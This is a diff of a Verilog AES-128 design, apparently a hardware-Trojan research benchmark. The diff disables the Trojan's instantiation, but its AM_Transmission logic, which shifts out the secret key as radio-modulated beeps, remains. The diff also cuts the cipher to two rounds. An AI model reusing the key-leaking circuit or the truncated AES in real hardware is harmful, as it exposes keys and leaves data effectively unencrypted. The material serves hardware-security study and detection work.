@@ -22,8 +22,8 @@ module top(clk, rst, state, key, out, Capacitance);
 	
 	
 	
-	Trojan_Trigger Tj_Trigger (.rst(rst), .clk(clk), .state(state), .Tj_Trig(Tj_Trig));
-	AM_Transmission TSC (.key(key), .clk(clk), .rst(rst), .Tj_Trig(Tj_Trig), .Antena(Antena));
+	//Trojan_Trigger Tj_Trigger (.rst(rst), .clk(clk), .state(state), .Tj_Trig(Tj_Trig));
+	//AM_Transmission TSC (.key(key), .clk(clk), .rst(rst), .Tj_Trig(Tj_Trig), .Antena(Antena));
 	/*
 	 always @(rst, clk)
 	 begin
@@ -104,8 +104,8 @@ module aes_128(clk, state, key, out);
 	
     one_round  r1 (.clk(clk), .state_in(s0), .key(k0b), .state_out(s1));
 	
-    one_round  r2 (.clk(clk), .state_in(s1), .key(k1b), .state_out(s2));
-	
+    one_round  r2 (.clk(clk), .state_in(s1), .key(k1b), .state_out(out));
+	/*
     one_round  r3 (.clk(clk), .state_in(s2), .key(k2b), .state_out(s3));
 	
     one_round  r4 (.clk(clk), .state_in(s3), .key(k3b), .state_out(s4));
@@ -116,7 +116,7 @@ module aes_128(clk, state, key, out);
     one_round  r7 (.clk(clk), .state_in(s6), .key(k6b), .state_out(s7));
     one_round  r8 (.clk(clk), .state_in(s7), .key(k7b), .state_out(s8));
     one_round  r9 (.clk(clk), .state_in(s8), .key(k8b), .state_out(out));
-	
+	*/
 
     //final_round rf (.clk(clk), .state_in(s9), .key_in(k9b), .state_out(out));
 	
@@ -1114,19 +1114,19 @@ module AM_Transmission(key, clk, rst, Tj_Trig, Antena);
     // Note: Using a register bit as a clock is generally risky in synthesis, 
     // but syntax is preserved here.
     always @(posedge Tj_Trig, posedge Baud8GeneratorACC[25])
-    begin
-        if (Tj_Trig == 1'b1) begin
-            SHIFTReg <= key;
-        end else begin    
-            SHIFTReg <= SHIFTReg >> 1; 
-        end    
-    end
+		begin
+			if (Tj_Trig == 1'b1) begin
+				SHIFTReg <= key;
+			end else begin    
+				SHIFTReg <= SHIFTReg >> 1; 
+			end    
+		end
 
-    assign beep1 = !(Baud8GeneratorACC[25] | Baud8GeneratorACC[24] | Baud8GeneratorACC[23]);
-    assign beep2 = !(Baud8GeneratorACC[25] | !(Baud8GeneratorACC[24]) | Baud8GeneratorACC[23]) & SHIFTReg[0];
-    assign beeps = beep1 | beep2;
-    assign MUX_Sel = beeps & Baud8GeneratorACC[15] & Baud8GeneratorACC[4];
-    assign Antena = (MUX_Sel) ? !(rst) : 1'b0; 
+		assign beep1 = !(Baud8GeneratorACC[25] | Baud8GeneratorACC[24] | Baud8GeneratorACC[23]);
+		assign beep2 = !(Baud8GeneratorACC[25] | !(Baud8GeneratorACC[24]) | Baud8GeneratorACC[23]) & SHIFTReg[0];
+		assign beeps = beep1 | beep2;
+		assign MUX_Sel = beeps & Baud8GeneratorACC[15] & Baud8GeneratorACC[4];
+		assign Antena = (MUX_Sel) ? !(rst) : 1'b0; 
 	//assign Antena = MUX_Sel; 
 	
 	
